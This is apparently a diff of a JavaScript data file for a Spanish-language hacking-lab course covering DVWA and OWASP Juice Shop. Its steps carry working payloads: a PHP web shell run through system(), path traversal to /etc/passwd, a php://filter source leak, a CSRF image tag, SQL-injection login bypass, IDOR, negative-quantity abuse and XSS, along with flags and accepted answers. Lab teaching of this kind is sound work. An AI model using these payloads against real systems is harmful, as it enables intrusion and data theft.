+Objetivo: Crear un archivo de una sola línea en lenguaje PHP que nos permita enviarle órdenes a la Raspberry Pi a través de la web.
+
+Paso a paso:
+1. En Kali Linux, abre una terminal.
+2. Crea el archivo ejecutando este comando:
+   echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > shell.php
+3. Comprueba que el archivo se haya creado correctamente viendo su contenido:
+   cat shell.php
+
+¿Qué es una Web Shell?: Es un pequeño script que le dice al servidor: "Si alguien visita esta página y añade en la URL el parámetro ?cmd=un_comando, pásalo a la función system() de Linux para que lo ejecute".`,
+            payload: '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>',
+            flag: 'FLAG{webshell-php-file-created}',
+            dondeEncontrarla: 'En tu terminal de Kali Linux al verificar el contenido con cat shell.php.',
+            quePoner: 'Escribe el nombre de la función de PHP usada para ejecutar órdenes: system',
+            flagsAceptadas: ["system", "system()", "FLAG{webshell-php-file-created}"],
+            objetivoFlag: 'Ingresa la flag cuando hayas creado el archivo shell.php en tu Kali Linux y puedas verificar su contenido con "cat shell.php" en la terminal.'
           },
           {
             numero: 2,
             titulo: 'Subir el archivo al servidor',
-            como: '1. En el menu lateral de DVWA, haz clic en "File Upload".\n\n2. Pulsa "Examinar" y selecciona el archivo "shell.php".\n\n3. Presiona "Upload". La aplicacion confirmara que el archivo fue subido a hackable/uploads/.',
-            payload: 'Archivo: shell.php'
+            como: `Donde se hace: En Firefox, en la sección "File Upload" de DVWA.
+
+Objetivo: Subir nuestro archivo shell.php al servidor web aprovechando que el formulario no valida si es una imagen real.
+
+Paso a paso:
+1. En el menú de DVWA, haz clic en "File Upload".
+2. Haz clic en el botón "Examinar..." o "Seleccionar archivo" y busca tu archivo shell.php.
+3. Haz clic en el botón "Upload".
+4. Aparecerá un mensaje azul o verde confirmando que el archivo fue subido con éxito:
+   ../../hackable/uploads/shell.php succesfully uploaded!
+
+¿Por qué es un fallo grave?: Un formulario de fotos de perfil jamás debería permitir subir archivos con extensión .php. Al no comprobar el tipo de archivo, el servidor lo guarda listo para ser ejecutado.`,
+            payload: 'Archivo: shell.php',
+            flag: 'FLAG{webshell-uploaded-to-server}',
+            dondeEncontrarla: 'En el mensaje verde de éxito que muestra DVWA tras hacer clic en Upload.',
+            quePoner: 'Escribe la ruta donde se guardó el archivo: ../../hackable/uploads/shell.php (o simplemente hackable/uploads/shell.php)',
+            flagsAceptadas: ["../../hackable/uploads/shell.php", "hackable/uploads/shell.php", "FLAG{webshell-uploaded-to-server}"],
+            objetivoFlag: 'Ingresa la flag cuando DVWA muestre el mensaje de exito indicando que el archivo fue subido a "../../hackable/uploads/shell.php".'
           },
           {
             numero: 3,
             titulo: 'Ejecutar comandos en la Raspberry Pi',
-            como: '1. En la barra de direcciones del navegador, ve a la ruta donde se alojo el archivo PHP subido.\n\n2. Anade "?cmd=" seguido del comando que quieras ejecutar (por ejemplo "id" o "uname -a").\n\n3. Veras la salida del comando con los privilegios del servidor web.',
-            payload: 'http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id'
+            como: `Donde se hace: En la barra de direcciones de tu navegador Firefox.
+
+Objetivo: Usar nuestra Web Shell para ejecutar comandos en el sistema operativo del servidor directamente desde la URL.
+
+Paso a paso:
+1. En la barra de direcciones de tu navegador, ve a la ruta donde se guardó el archivo y añade el comando ?cmd=id al final:
+   http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id
+2. Presiona Enter.
+3. Verás en pantalla la respuesta devuelta por Linux en la Raspberry Pi:
+   uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+¿Qué significa esto?: Has conseguido lo que en ciberseguridad se conoce como RCE (Remote Code Execution o Ejecución Remota de Código): control total para mandar órdenes al servidor desde cualquier parte de la red.`,
+            payload: 'http://<IP_LAB>/dvwa/hackable/uploads/shell.php?cmd=id',
+            flag: 'FLAG{webshell-rce-uid-www-data}',
+            dondeEncontrarla: 'En el navegador, al visitar la URL con ?cmd=id y ver la respuesta de uid.',
+            quePoner: 'Escribe el número de usuario (uid) de www-data que viste: 33',
+            flagsAceptadas: ["33", "uid=33", "uid=33(www-data)", "FLAG{webshell-rce-uid-www-data}"],
+            objetivoFlag: 'Ingresa la flag cuando tu web shell devuelva en el navegador la linea "uid=33(www-data) gid=33(www-data)" como resultado del comando id.'
           }
         ]
       },
@@ -272,20 +825,66 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Analizar el parametro de inclusion',
-            como: '1. En el menu lateral de DVWA, haz clic en "File Inclusion".\n\n2. Haz clic en cualquiera de los enlaces de ejemplo (como "file1.php") y observa la barra de direcciones.\n\n3. Nota como la pagina recibe el archivo a cargar a traves del parametro "?page=" en la URL.',
-            payload: '?page=include.php'
+            como: `Donde se hace: En Firefox, en la sección "File Inclusion" de DVWA.
+
+Objetivo: Descubrir cómo decide la aplicación web qué archivo debe cargar y mostrar en la pantalla.
+
+Paso a paso:
+1. En el menú de DVWA, entra a "File Inclusion".
+2. Verás tres enlaces de ejemplo: "file1.php", "file2.php", "file3.php". Haz clic en cualquiera de ellos.
+3. Observa atentamente la barra de direcciones de tu navegador:
+   http://<IP_LAB>/dvwa/vulnerabilities/fi/?page=file1.php
+
+¿Qué significa esto?: La aplicación utiliza un parámetro llamado ?page= para pedirle al servidor qué archivo debe leer y mostrar.`,
+            payload: '?page=include.php',
+            flag: 'FLAG{lfi-page-param-identified}',
+            dondeEncontrarla: 'En la barra de direcciones de tu navegador al hacer clic en los enlaces de File Inclusion.',
+            quePoner: 'Escribe el nombre del parámetro en la URL: page',
+            flagsAceptadas: ["page", "page=", "?page", "FLAG{lfi-page-param-identified}"],
+            objetivoFlag: 'Ingresa la flag cuando confirmes en la URL del navegador que la pagina usa el parametro ?page= para cargar archivos (ej: .../file_inclusion/?page=file1.php).'
           },
           {
             numero: 2,
             titulo: 'Escapar del directorio raiz (Path Traversal)',
-            como: '1. Borra el valor de "?page=" y escribe multiples secuencias "../" seguidas de "/etc/passwd".\n\n2. Presiona Enter.\n\n3. Cada "../" retrocede un directorio hasta llegar a la raiz del sistema y mostrar el archivo de usuarios del sistema operativo.',
-            payload: '?page=../../../../../../../../etc/passwd'
+            como: `Donde se hace: En la barra de direcciones de Firefox.
+
+Objetivo: Usar la técnica de los dos puntos y barra (../) para salir de la carpeta web y leer un archivo confidencial del sistema operativo.
+
+Paso a paso:
+1. En la barra de direcciones, cambia file1.php por una serie de saltos hacia atrás seguidos de /etc/passwd:
+   ../../../../../../../../etc/passwd
+2. Presiona Enter.
+3. Verás impreso en pantalla el listado de usuarios del sistema Linux (root:x:0:0:root:... y su terminal /bin/bash).
+
+¿Por qué funciona?: Cada ../ significa "sube un nivel de carpeta hacia atrás". Poniendo varios seguidos, llegamos a la raíz del disco duro (/) y desde ahí abrimos el archivo /etc/passwd. Esto se conoce como Directory Traversal.`,
+            payload: '?page=../../../../../../../../etc/passwd',
+            flag: 'FLAG{lfi-etcpasswd-file-read}',
+            dondeEncontrarla: 'En la página de DVWA tras incluir /etc/passwd, en la línea de root.',
+            quePoner: 'Escribe la terminal o intérprete asignado a root: /bin/bash (o bin/bash)',
+            flagsAceptadas: ["/bin/bash", "bin/bash", "bash", "FLAG{lfi-etcpasswd-file-read}"],
+            objetivoFlag: 'Ingresa la flag cuando la pagina muestre el contenido de /etc/passwd del servidor, con lineas como "root:x:0:0:root:/root:/bin/bash".'
           },
           {
             numero: 3,
             titulo: 'Extraer codigo fuente con Wrapper Base64',
-            como: '1. Escribe en "?page=" el wrapper php://filter/convert.base64-encode/resource=index.php\n\n2. Presiona Enter para recibir la cadena codificada en Base64.\n\n3. Decodifica la cadena para leer el codigo fuente original del archivo index.php.',
-            payload: '?page=php://filter/convert.base64-encode/resource=index.php'
+            como: `Donde se hace: En la barra de direcciones de Firefox.
+
+Objetivo: Descargar el código fuente en PHP de un archivo sin que el servidor lo ejecute, convirtiéndolo a texto Base64.
+
+Paso a paso:
+1. En la barra de direcciones, cambia el valor de ?page= por este filtro especial de PHP:
+   ?page=php://filter/convert.base64-encode/resource=index.php
+2. Presiona Enter.
+3. La pantalla se llenará con una cadena larga de texto codificada en Base64 que comienza por PD9waHA...
+4. Al decodificar esa cadena (por ejemplo en la herramienta CyberChef o con el comando base64 -d), obtendrás el código fuente original del archivo index.php (con <?php).
+
+¿Para qué sirve esto a un auditor?: Normalmente si intentas abrir un archivo .php con LFI, el servidor lo ejecuta y no te muestra su código. Con este filtro, el servidor lo convierte a texto plano Base64 antes de procesarlo, permitiéndote auditar el código fuente.`,
+            payload: '?page=php://filter/convert.base64-encode/resource=index.php',
+            flag: 'FLAG{lfi-base64-source-code-exposed}',
+            dondeEncontrarla: 'En la respuesta de la página donde aparece la cadena en Base64.',
+            quePoner: 'Escribe los primeros 7 caracteres de la cadena Base64 que viste: PD9waHA',
+            flagsAceptadas: ["PD9waHA", "pd9wah", "FLAG{lfi-base64-source-code-exposed}"],
+            objetivoFlag: 'Ingresa la flag cuando la pagina devuelva una larga cadena en Base64 comenzando con "PD9waHA" (<?php en base64), que es el codigo fuente de index.php.'
           }
         ]
       },
@@ -298,14 +897,45 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Analizar peticion de cambio de contrasena',
-            como: '1. En el menu lateral de DVWA, haz clic en "CSRF".\n\n2. Escribe una nueva contrasena en ambos campos y pulsa "Change".\n\n3. Revisa la barra de direcciones: la solicitud se envia por metodo GET sin ningun token de proteccion anti-CSRF.',
-            payload: 'GET /dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change'
+            como: `Donde se hace: En Firefox, en la sección "CSRF" de DVWA.
+
+Objetivo: Comprender cómo cambia la contraseña DVWA y comprobar que carece de protección anti-CSRF.
+
+Paso a paso:
+1. En el menú de DVWA, entra a "CSRF".
+2. Escribe una nueva contraseña en ambos campos (por ejemplo: 123) y haz clic en "Change".
+3. Revisa la barra de direcciones del navegador:
+   .../csrf/?password_new=123&password_conf=123&Change=Change
+
+¿Dónde está el fallo?: La solicitud se envía por método GET y no incluye ningún token temporal secreto (código anti-CSRF). Cualquier sitio web externo puede recrear este enlace exacto.`,
+            payload: 'GET /dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change',
+            flag: 'FLAG{csrf-get-no-token-confirmed}',
+            dondeEncontrarla: 'En la barra de direcciones de tu navegador tras presionar Change.',
+            quePoner: 'Escribe el nombre del parámetro que envía la nueva contraseña: password_new',
+            flagsAceptadas: ["password_new", "password_conf", "FLAG{csrf-get-no-token-confirmed}"],
+            objetivoFlag: 'Ingresa la flag cuando veas en la barra de direcciones la peticion GET con los parametros password_new y password_conf expuestos en la URL tras hacer "Change".'
           },
           {
             numero: 2,
             titulo: 'Construir vector de ataque HTML',
-            como: '1. Crea un archivo "exploit.html" con una etiqueta de imagen oculta apuntando a la URL de cambio de contrasena.\n\n2. Si una victima con sesion iniciada en DVWA abre este archivo, su navegador ejecutara la peticion automaticamente en segundo plano, cambiando su contrasena sin su consentimiento.',
-            payload: '<img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">'
+            como: `Donde se hace: En tu editor de texto o en el navegador.
+
+Objetivo: Entender cómo una página web trampa puede obligar al navegador de una víctima a cambiar su contraseña sin su consentimiento.
+
+Paso a paso:
+1. Un atacante puede crear un archivo HTML sencillo con una etiqueta de imagen invisible:
+   <img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
+2. Si un usuario con sesión abierta en DVWA visita esa página trampa, su navegador intentará "cargar la imagen", ejecutando en realidad la orden de cambio de contraseña a "hacked".
+3. Al visitar esa URL directamente en el navegador, verás el mensaje verde de confirmación:
+   Password Changed.
+
+¿Por qué se llama CSRF?: Significa Cross-Site Request Forgery (Falsificación de Peticiones en Sitios Cruzados). El usuario nunca quiso cambiar su contraseña, pero el sitio malicioso falsificó la petición en su nombre aprovechando su sesión abierta.`,
+            payload: '<img src="http://<IP_LAB>/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">',
+            flag: 'FLAG{csrf-exploit-html-password-changed}',
+            dondeEncontrarla: 'En el mensaje de confirmación que muestra DVWA tras cambiar la contraseña.',
+            quePoner: 'Escribe el mensaje de éxito que muestra DVWA: Password Changed.',
+            flagsAceptadas: ["Password Changed.", "Password Changed", "password changed.", "FLAG{csrf-exploit-html-password-changed}"],
+            objetivoFlag: 'Ingresa la flag cuando al abrir tu exploit.html en el navegador, DVWA muestre el mensaje "Password Changed." confirmando que el ataque CSRF funciono.'
           }
         ]
       }
@@ -324,20 +954,63 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Configurar filtro de trafico JSON en Burp y acceder a Juice Shop',
-            como: '1. Con Burp Suite abierto y FoxyProxy en "Burp", navega a Juice Shop.\n\n2. En Burp Suite, ve a "Proxy" -> "HTTP history". Haz clic en la barra de filtros superior.\n\n3. Marca solo "JSON", "Fetch" y "XHR" y pulsa "Apply". Esto filtrara recursos estaticos y te enfocara en la API REST de Juice Shop.',
-            payload: 'http://<IP_PI>:3000\nFiltro Burp: JSON / Fetch / XHR'
+            como: `Donde se hace: En Burp Suite y Firefox.
+
+Objetivo: Conectarse a la tienda moderna OWASP Juice Shop y filtrar las peticiones para enfocarnos únicamente en su API REST (datos JSON), ocultando imágenes y estilos.
+
+Paso a paso:
+1. Abre Firefox con FoxyProxy en modo "Burp".
+2. Entra a Juice Shop en tu Raspberry Pi: http://<IP_PI>:3000
+3. En Burp Suite, ve a "Proxy" -> "HTTP history".
+4. Haz clic en la barra gris superior que dice "Filter: ...".
+5. En la ventana de filtros, asegúrate de marcar "JSON" y "Fetch/XHR" para ocultar imágenes y archivos estáticos. Haz clic en "Apply".
+
+¿Por qué hacemos esto?: Juice Shop es una aplicación moderna (Single Page Application). La interfaz en Angular habla con el servidor mediante peticiones en formato JSON.`,
+            payload: 'http://<IP_PI>:3000\nFiltro Burp: JSON / Fetch / XHR',
+            flag: 'FLAG{juice-burp-json-filter-active}',
+            dondeEncontrarla: 'En Burp Suite en Proxy -> HTTP history tras activar el filtro JSON / Fetch / XHR.',
+            quePoner: 'Escribe el formato de datos de la API que filtramos: JSON',
+            flagsAceptadas: ["JSON", "json", "FLAG{juice-burp-json-filter-active}"],
+            objetivoFlag: 'Ingresa la flag cuando Juice Shop cargue en el navegador y en Burp HTTP history solo veas peticiones de tipo JSON/XHR (sin CSS, JS ni imagenes).'
           },
           {
             numero: 2,
             titulo: 'Buscar ruta oculta del Score Board',
-            como: '1. Con DevTools abierto (F12), abre la busqueda global con Ctrl + Shift + F.\n\n2. Escribe "score-board" y presiona Enter.\n\n3. Localiza la definicion de rutas del enrutador de Angular donde figura el componente del tablero de puntuacion.',
-            payload: 'Buscar: score-board\nAtajo DevTools: Ctrl + Shift + F'
+            como: `Donde se hace: En el navegador Firefox usando las herramientas de desarrollador (F12).
+
+Objetivo: Inspeccionar el código JavaScript de la aplicación para encontrar la ruta secreta que lleva al panel de retos oficial.
+
+Paso a paso:
+1. En la pestaña de Juice Shop en Firefox, presiona F12 para abrir las herramientas de desarrollador.
+2. Presiona las teclas Ctrl + Shift + F (o Cmd + Option + F en Mac) para abrir la búsqueda global en todos los archivos.
+3. En la barra de búsqueda escribe: score-board y presiona Enter.
+4. Verás resultados dentro de un archivo JavaScript (como main.js), donde el enrutador de Angular define la ruta: path: 'score-board'.`,
+            payload: 'Buscar: score-board\nAtajo DevTools: Ctrl + Shift + F',
+            flag: 'FLAG{juice-scoreboard-route-found}',
+            dondeEncontrarla: 'En DevTools (F12 -> búsqueda con Ctrl+Shift+F), localizando la ruta en el código de Angular.',
+            quePoner: 'Escribe el nombre de la ruta que encontraste: score-board',
+            flagsAceptadas: ["score-board", "score board", "#/score-board", "FLAG{juice-scoreboard-route-found}"],
+            objetivoFlag: 'Ingresa la flag cuando localices en DevTools la definicion de la ruta "score-board" dentro del archivo de JavaScript del bundle de Angular (main.js).'
           },
           {
             numero: 3,
             titulo: 'Desbloquear panel de retos',
-            como: '1. En la barra de direcciones del navegador con Juice Shop abierto, anade "/#/score-board" al final y presiona Enter.\n\n2. La aplicacion cargara el Score Board oficial.\n\n3. El servidor registrara automaticamente la resolucion de tu primer reto del laboratorio.',
-            payload: 'http://<IP_LAB>/#/score-board'
+            como: `Donde se hace: En la barra de direcciones de Firefox.
+
+Objetivo: Visitar la ruta oculta y desbloquear el Score Board con la primera insignia de reto completado.
+
+Paso a paso:
+1. En la barra de direcciones de Juice Shop, añade /#/score-board al final:
+   http://<IP_PI>:3000/#/score-board
+2. Presiona Enter.
+3. Verás una notificación emergente con confeti felicitándote por resolver el primer reto: "Find the carefully hidden 'Score Board' page".
+4. En el panel aparecerá la tarjeta marcada con una insignia verde de "Solved" (Resuelto).`,
+            payload: 'http://<IP_LAB>/#/score-board',
+            flag: 'FLAG{juice-scoreboard-challenge-1-solved}',
+            dondeEncontrarla: 'En el Score Board de Juice Shop tras acceder a /#/score-board.',
+            quePoner: 'Escribe la palabra que indica que el reto está resuelto: Solved (o Score Board)',
+            flagsAceptadas: ["Score Board", "Solved", "solved", "score-board", "FLAG{juice-scoreboard-challenge-1-solved}"],
+            objetivoFlag: 'Ingresa la flag cuando accedas al Score Board y veas la primera tarjeta de reto marcada como resuelta (estrella verde o texto "Solved") en el panel.'
           }
         ]
       },
@@ -350,14 +1023,45 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Interceptar peticion de login en Burp Suite',
-            como: '1. En Juice Shop, haz clic en "Account" -> "Login".\n\n2. En Burp Suite, activa "Intercept is on".\n\n3. Escribe correo y contrasena de prueba y pulsa "Log in". En Burp veras la peticion POST al endpoint REST en formato JSON.',
-            payload: 'POST /rest/user/login\n{"email":"test@test.com","password":"123"}'
+            como: `Donde se hace: En Firefox y Burp Suite.
+
+Objetivo: Observar cómo viajan las credenciales hacia una API REST moderna en formato JSON cuando intentas iniciar sesión.
+
+Paso a paso:
+1. En Juice Shop, haz clic en "Account" (arriba a la derecha) y luego en "Login".
+2. En Burp Suite, ve a "Proxy" -> "Intercept" y activa "Intercept is on".
+3. En el formulario de login de Juice Shop escribe un email cualquiera (test@test.com) y una contraseña cualquiera (123), y haz clic en "Log in".
+4. Cambia a Burp Suite: verás la petición POST /rest/user/login con un cuerpo JSON conteniendo {"email":"test@test.com","password":"123"}.`,
+            payload: 'POST /rest/user/login\n{"email":"test@test.com","password":"123"}',
+            flag: 'FLAG{juice-sqli-post-intercepted}',
+            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept, observando la primera línea de la petición POST.',
+            quePoner: 'Escribe la ruta del endpoint de login: /rest/user/login',
+            flagsAceptadas: ["/rest/user/login", "rest/user/login", "user/login", "FLAG{juice-sqli-post-intercepted}"],
+            objetivoFlag: 'Ingresa la flag cuando veas en Burp la peticion POST a /rest/user/login con el body JSON conteniendo los campos email y password que enviaste.'
           },
           {
             numero: 2,
             titulo: 'Bypass de autenticacion de Administrador',
-            como: '1. En el campo "Email" del formulario, escribe el payload de escape SQL.\n\n2. Escribe cualquier texto ficticio en "Password".\n\n3. Haz clic en "Log in". La condicion OR 1=1 anulara la comprobacion de clave e iniciara sesion en la cuenta del Administrador.',
-            payload: "' OR 1=1--"
+            como: `Donde se hace: En el formulario de Login de Juice Shop (con "Intercept is off" en Burp Suite para navegar rápido).
+
+Objetivo: Entrar a la cuenta del Administrador de la tienda sin saber su contraseña, utilizando una inyección SQL.
+
+Paso a paso:
+1. Asegúrate de que en Burp Suite esté en "Intercept is off" (o desactiva FoxyProxy temporalmente).
+2. En el campo "Email" del formulario de login de Juice Shop, escribe exactamente:
+   ' OR 1=1--
+3. En el campo "Password", escribe cualquier texto inventado (por ejemplo: abc).
+4. Haz clic en el botón "Log in".
+5. ¡Listo! La tienda iniciará sesión inmediatamente. En la esquina superior derecha, haz clic en "Account" y verás que estás conectado como:
+   admin@juice-sh.op
+
+¿Por qué funciona?: Las dos rayas (--) en SQL representan un comentario, anulando por completo la verificación de contraseña. Y como 1=1 siempre es verdadero, la base de datos devuelve la primera cuenta registrada: el Administrador.`,
+            payload: "' OR 1=1--",
+            flag: 'FLAG{juice-sqli-admin-login-success}',
+            dondeEncontrarla: 'En el menú superior de Juice Shop al hacer clic en Account tras iniciar sesión.',
+            quePoner: 'Escribe el correo del administrador con el que iniciaste sesión: admin@juice-sh.op',
+            flagsAceptadas: ["admin@juice-sh.op", "admin", "admin@juice-shop.op", "FLAG{juice-sqli-admin-login-success}"],
+            objetivoFlag: 'Ingresa la flag cuando Juice Shop te redirija al inicio de sesion exitoso como admin@juice-sh.op, con el nombre "Admin" visible en el menu de usuario superior.'
           }
         ]
       },
@@ -370,14 +1074,44 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Capturar peticion de adicion al carrito',
-            como: '1. En el catalogo de Juice Shop, activa "Intercept is on" en Burp Suite.\n\n2. Haz clic en "Add to Basket" de cualquier producto.\n\n3. Revisa en Burp la peticion POST enviada a "/api/BasketItems/" con "quantity: 1".',
-            payload: 'POST /api/BasketItems/\n{"ProductId":1,"BasketId":"1","quantity":1}'
+            como: `Donde se hace: En Burp Suite y Firefox.
+
+Objetivo: Capturar el momento en que agregas un producto a la cesta para observar el parámetro de cantidad en la petición JSON.
+
+Paso a paso:
+1. Inicia sesión en Juice Shop y ve al catálogo principal de productos.
+2. En Burp Suite, activa "Intercept is on".
+3. En Juice Shop, haz clic en el botón "Add to Basket" (Añadir a la cesta) de cualquier producto (por ejemplo, Apple Juice).
+4. En Burp Suite verás detenida la petición POST /api/BasketItems/ con un cuerpo JSON como:
+   {"ProductId":1,"BasketId":"...","quantity":1}`,
+            payload: 'POST /api/BasketItems/\n{"ProductId":1,"BasketId":"1","quantity":1}',
+            flag: 'FLAG{juice-logic-basket-post-captured}',
+            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept tras hacer clic en Add to Basket.',
+            quePoner: 'Escribe el valor inicial del parámetro quantity: 1',
+            flagsAceptadas: ["1", "quantity: 1", "FLAG{juice-logic-basket-post-captured}"],
+            objetivoFlag: 'Ingresa la flag cuando veas en Burp Intercept la peticion POST a /api/BasketItems con el campo "quantity":1 en el body JSON capturado.'
           },
           {
             numero: 2,
             titulo: 'Alterar cantidad a valor negativo',
-            como: '1. En la pestana "Intercept" de Burp, modifica el parametro "quantity" de 1 a -5.\n\n2. Pulsa "Forward" para enviar la peticion modificada.\n\n3. Como el backend no valida cantidades negativas, el total de la cesta se reducira permitiendo compras gratuitas.',
-            payload: '{"ProductId":1,"BasketId":"1","quantity":-5}'
+            como: `Donde se hace: En Burp Suite (en la ventana de Intercept).
+
+Objetivo: Modificar la cantidad a un número negativo para reducir el precio total del carrito y obtener productos gratis.
+
+Paso a paso:
+1. Con la petición aún detenida en Burp Suite, cambia el número 1 del campo "quantity": 1 por un número negativo:
+   {"ProductId":1,"BasketId":"...","quantity":-5}
+2. Haz clic en el botón "Forward" en Burp Suite para enviar la petición modificada.
+3. En Firefox, haz clic en el icono del carrito de compras arriba a la derecha.
+4. Verás que el producto tiene una cantidad de -5 y el precio total de tu cesta se ha reducido o muestra un saldo a tu favor.
+
+¿Por qué es un fallo de lógica de negocio?: Los desarrolladores validaron las cantidades en los botones de la pantalla, pero olvidaron verificar en el servidor que la cantidad recibida fuera siempre un número entero positivo mayor a cero.`,
+            payload: '{"ProductId":1,"BasketId":"1","quantity":-5}',
+            flag: 'FLAG{juice-logic-negative-total-achieved}',
+            dondeEncontrarla: 'En la vista del carrito de compras de Juice Shop tras alterar quantity a -5.',
+            quePoner: 'Escribe el valor negativo que inyectaste: -5',
+            flagsAceptadas: ["-5", "$0.00", "0", "FLAG{juice-logic-negative-total-achieved}"],
+            objetivoFlag: 'Ingresa la flag cuando el carrito de Juice Shop muestre un total negativo o en $0.00 gracias a la cantidad -5 que enviaste via Burp.'
           }
         ]
       },
@@ -390,14 +1124,43 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Localizar endpoint de la cesta',
-            como: '1. En Juice Shop, haz clic en el icono del carrito de compras.\n\n2. Abre "Red" (Network) en DevTools (F12) o revisa el historial HTTP en Burp Suite.\n\n3. Identifica la peticion GET con un numero secuencial en la URL (por ejemplo, "/rest/basket/2").',
-            payload: 'GET /rest/basket/2'
+            como: `Donde se hace: En Firefox y Burp Suite.
+
+Objetivo: Identificar cómo sabe la tienda cuál es tu cesta de compras (observando el número identificador en la URL).
+
+Paso a paso:
+1. En Juice Shop, haz clic en el icono del carrito de compras.
+2. En Burp Suite, ve a "Proxy" -> "HTTP history" y busca las últimas peticiones realizadas.
+3. Localiza la petición GET hacia una ruta como /rest/basket/2 (donde el número final es tu ID de cesta personal).`,
+            payload: 'GET /rest/basket/2',
+            flag: 'FLAG{juice-idor-basket-endpoint-found}',
+            dondeEncontrarla: 'En Burp HTTP history o DevTools Network al abrir la cesta, observando la ruta con ID numérico.',
+            quePoner: 'Escribe el nombre del recurso de la API de la cesta: basket (o /rest/basket)',
+            flagsAceptadas: ["basket", "/rest/basket", "FLAG{juice-idor-basket-endpoint-found}"],
+            objetivoFlag: 'Ingresa la flag cuando identifiques en Burp HTTP history o DevTools Network la peticion GET a /rest/basket/{id} con tu ID de cesta visible en la URL.'
           },
           {
             numero: 2,
             titulo: 'Consultar cesta de otro usuario',
-            como: '1. En Burp Suite, toma la peticion de la cesta y modifica el numero del final a 1.\n\n2. Envia la solicitud al servidor.\n\n3. Como la API no valida que la cesta pertenezca al usuario que la solicita, recibiras los datos de la cesta de otro usuario.',
-            payload: 'GET /rest/basket/1'
+            como: `Donde se hace: En Burp Suite (utilizando la herramienta Repeater).
+
+Objetivo: Cambiar el número de tu cesta por el número de la cesta de otro usuario para ver sus productos privados sin autorización.
+
+Paso a paso:
+1. En Burp Suite en "HTTP history", haz clic derecho sobre la petición GET /rest/basket/X y elige "Send to Repeater" (Enviar a Repeater).
+2. Ve a la pestaña "Repeater" arriba.
+3. En la primera línea, cambia el número de la cesta por el número 1:
+   GET /rest/basket/1 HTTP/1.1
+4. Haz clic en el botón naranja "Send" (Enviar).
+5. En el panel de respuesta a la derecha, verás un JSON con los productos que pertenecen al carrito de otro usuario (la cesta número 1).
+
+¿Qué significa IDOR?: Insecure Direct Object Reference (Referencia Directa Insegura a Objetos). Ocurre cuando una aplicación expone un identificador directo (como un número en la URL) sin verificar si quien lo solicita tiene permiso para verlo.`,
+            payload: 'GET /rest/basket/1',
+            flag: 'FLAG{juice-idor-other-user-basket-exposed}',
+            dondeEncontrarla: 'En la respuesta HTTP en Burp Suite al consultar la cesta con ID 1.',
+            quePoner: 'Escribe el número de la cesta ajena que consultaste: 1',
+            flagsAceptadas: ["1", "BasketId: 1", "FLAG{juice-idor-other-user-basket-exposed}"],
+            objetivoFlag: 'Ingresa la flag cuando la respuesta de /rest/basket/1 te devuelva el JSON con los productos de otra cuenta, confirmando el fallo de autorizacion IDOR.'
           }
         ]
       },
@@ -410,14 +1173,47 @@ export const ROADMAP_MODULOS = {
           {
             numero: 1,
             titulo: 'Inyeccion en la barra de busqueda',
-            como: '1. En Juice Shop, haz clic en el campo de busqueda de productos (icono lupa).\n\n2. Escribe el payload con la etiqueta iframe y codigo JavaScript.\n\n3. Presiona Enter. Al insertarse en el DOM sin sanitizacion, el navegador ejecutara el codigo mostrando la ventana de alerta.',
-            payload: '<iframe src="javascript:alert(`XSS`)">'
+            como: `Donde se hace: En la barra de búsqueda de Juice Shop.
+
+Objetivo: Ejecutar una alerta JavaScript en una aplicación moderna de página única (SPA) a través del campo de búsqueda de productos.
+
+Paso a paso:
+1. En la página principal de Juice Shop, haz clic en el icono de la lupa (barra de búsqueda).
+2. Copia y pega exactamente este código:
+   <iframe src="javascript:alert(\`XSS\`)">
+3. Presiona la tecla Enter.
+4. Aparecerá en la pantalla un cuadro de alerta emergente con el texto "XSS".
+
+¿Por qué usamos iframe en vez de script?: En aplicaciones modernas creadas con Angular, las etiquetas <script> tradicionales suelen ser bloqueadas automáticamente por el framework, pero etiquetas como <iframe> pueden eludir estos filtros si no están bien saneadas.`,
+            payload: '<iframe src="javascript:alert(`XSS`)">',
+            flag: 'FLAG{juice-xss-dom-iframe-alert-fired}',
+            dondeEncontrarla: 'En la alerta emergente que salta en tu navegador tras presionar Enter en la barra de búsqueda.',
+            quePoner: 'Escribe el texto que aparece dentro del cuadro de alerta emergente: XSS',
+            flagsAceptadas: ["XSS", "xss", "FLAG{juice-xss-dom-iframe-alert-fired}"],
+            objetivoFlag: 'Ingresa la flag cuando el payload iframe dispare el alert en la barra de busqueda de Juice Shop, confirmando la vulnerabilidad DOM XSS en la SPA.'
           },
           {
             numero: 2,
             titulo: 'Inyeccion persistente en resenas de productos',
-            como: '1. Inicia sesion y haz clic en cualquier producto del catalogo para abrir su ficha.\n\n2. Desplazate a la seccion "Reviews" (Resenas).\n\n3. En el campo de comentario, introduce el payload de script y pulsa "Submit". La resena maliciosa quedara almacenada y se ejecutara para todos los usuarios que visiten ese producto.',
-            payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>'
+            como: `Donde se hace: En la sección de reseñas / comentarios de cualquier producto en Juice Shop.
+
+Objetivo: Dejar un comentario con código malicioso que se active automáticamente para cualquier persona que mire el producto.
+
+Paso a paso:
+1. Con tu sesión iniciada en Juice Shop, haz clic en la foto de cualquier producto del catálogo para abrir su ficha.
+2. Desplázate hacia abajo a la sección "Reviews" (Reseñas) y haz clic en el campo para escribir una nueva reseña.
+3. Pega este payload diseñado para burlar el sanitizador:
